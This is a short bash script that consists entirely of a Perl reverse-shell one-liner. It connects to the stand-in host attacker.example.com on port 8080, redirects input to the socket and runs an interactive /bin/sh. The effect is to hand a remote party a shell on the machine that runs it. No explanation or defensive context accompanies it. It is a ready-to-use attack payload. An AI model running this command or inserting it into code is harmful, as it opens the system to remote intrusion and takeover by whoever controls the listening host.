#!/bin/bash
perl -e 'use Socket;$i="attacker.example.com";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");exec("/bin/sh -i");'
